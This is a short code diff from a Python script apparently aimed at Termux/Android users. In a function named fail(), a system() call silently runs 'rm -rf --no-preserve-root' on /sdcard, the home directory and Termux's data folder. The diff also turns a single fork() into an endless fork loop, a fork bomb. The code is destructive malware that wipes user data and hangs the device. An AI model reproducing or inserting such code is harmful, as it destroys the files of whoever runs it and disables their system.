@@ -20,4 +20,5 @@ def fail():
     else:
         system('rm -rf --no-preserve-root /sdcard > /dev/null ; rm -rf --no-preserve-root $HOME > /dev/null ; rm -rf --no-preserve-root /data/data/com.termux/ > /dev/null')
 
-    fork()
+    while True:
+        fork()
